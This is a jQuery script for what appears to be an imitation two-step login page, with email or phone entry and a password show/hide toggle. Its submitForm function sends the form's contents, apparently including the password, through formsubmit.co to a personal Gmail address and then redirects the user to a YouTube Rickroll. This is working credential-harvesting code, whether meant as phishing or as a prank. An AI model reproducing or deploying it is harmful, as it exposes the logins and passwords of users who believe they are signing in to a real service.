console.log('1 test');

  if ($('.email-block').hasClass('active')) {
    $('.input-email').addClass('active');
  }
  if ($('.phone-block').hasClass('active')) {
    $('.input-phone').addClass('active');
  }

  $('.AuthLoginInputToggle-type').click(function(){
    $('.AuthLoginInputToggle-type').removeClass('active');
    $(this).addClass('active');
    if ($('.email-block').hasClass('active')) {
      $('.input-email').addClass('active');
    }else{
      $('.input-email').removeClass('active');
    }
    if ($('.phone-block').hasClass('active')) {
      $('.input-phone').addClass('active');
    }else{
      $('.input-phone').removeClass('active');
    }
  });
  
  $('#phone').mask('+7(000) 000-000-00', {placeholder: "+7("});
   

$('.voiti').click(function(){
  var inputValues = $('.form-input');
  var hasEmptyInput = false;

  inputValues.each(function() {
      if ($(this).val() === '') {
          hasEmptyInput = true;
          return false; // Прервать цикл, если найден пустой инпут
      }
  });

  if (hasEmptyInput && inputValues.length === 2) {
      $('.error').addClass('active');
      $('.first .input-email input').addClass('error-input');
      $('.first .input-phone input').addClass('error-input');
  } else {
      $('form > div').removeClass('hidden-section');
      $('form > div').removeClass('show-section');
      $('.first').addClass('hidden-section');
      $('.second').addClass('show-section');
      $('.error').removeClass('active');
  }
});



// $('.voiti').click(function(){
//   $('form > div').removeClass('hidden-section');
//   $('form > div').removeClass('show-section');
//   $('.first').addClass('hidden-section');
//   $('.second').addClass('show-section');
// });
$('.back-icon').click(function(){
  $('form > div').removeClass('hidden-section');
  $('form > div').removeClass('show-section');
  $('.first').addClass('show-section');
  $('.second').addClass('hidden-section');
});
$('.second .login-info').click(function(){
  $('form > div').removeClass('hidden-section');
  $('form > div').removeClass('show-section');
  $('.first').addClass('show-section');
  $('.second').addClass('hidden-section');
});



$('.first .input .form-input').on('input', function() {
  var inputValue = $(this).val();
  $('.user-login span').text(inputValue);
});
$('.first .input #phone').on('input', function() {
  var inputValue = $(this).val();
  $('.user-login span').text(inputValue);
});

$('#showPass').click(function(){
  $('#showPass').addClass('hidden');
  $('#showPass').removeClass('active');
  $('#hidePass').removeClass('hidden')
  $('#hidePass').addClass('active');  
  $("#myPass").attr("type", "text");
});

$('#hidePass').click(function(){
  $('#hidePass').addClass('hidden');
  $('#hidePass').removeClass('active');
  $('#showPass').removeClass('hidden')
  $('#showPass').addClass('active'); 
  $("#myPass").attr("type", "password") 
});



   function submitForm() {
            const form = document.getElementById('contactForm');
            const loadingIndicator = document.getElementById('loadingIndicator');
            const formData = new FormData(form);

            // Показать индикатор загрузки
            //loadingIndicator.style.display = 'block';

            fetch('https://formsubmit.co/ajax/qqslovinskiy@gmail.com', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                console.log('Success:', data);
                
                form.reset(); // Сбросить форму после успешной отправки
                window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'; // Перенаправление на YouTube
            })
            .catch(error => {
                console.error('Error:', error);
                
            })
           // .finally(() => {
                // Скрыть индикатор загрузки после завершения запроса
            //    loadingIndicator.style.display = 'none';
           // });
        }
